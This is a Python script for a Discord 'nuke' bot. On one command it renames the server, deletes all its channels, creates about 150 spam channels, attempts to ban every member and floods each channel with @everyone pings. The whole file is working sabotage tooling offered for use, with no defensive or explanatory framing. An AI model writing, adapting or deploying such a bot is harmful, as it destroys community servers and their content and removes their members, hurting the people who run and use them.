import discord,os,asyncio
from discord.ext import commands, tasks



prefix='>'
channel1='Nuked1'
channel2='Nuked2'
reason='It\'s a nuke'

intents = discord.Intents.default()
intents.members = True

client = commands.Bot(command_prefix=prefix, intents=intents)


@client.event
async def on_ready():
    print("Bot Logged In!")
    await client.change_presence(activity=discord.Game(name="Can nuke now!"))


with open ('icon.png','rb') as f:
    icon = f.read()




@client.command()
async def nuke(ctx):
  await ctx.send('Starting Nuke!')
  await asyncio.sleep(0.5)

  await ctx.guild.edit(name='Server Nuked', icon=icon)

  for c in ctx.guild.channels :
    await c.delete()

  
  guild = ctx.message.guild
  n=0

  
  while(n<=75):

    await guild.create_text_channel(f'{channel1}')
    await guild.create_text_channel(f'{channel2}')
    n+=1

  for b in ctx.guild.members:
    try:
      await b.ban(reason=reason)
    except:
      print('Can\'t ban')
      pass
    
  for c in ctx.guild.channels:
    await c.send('@everyone It\'s a nuke')
    await c.send('@everyone It\'s a nuke')




TOKEN = '<bot_token>'
client.run(TOKEN)
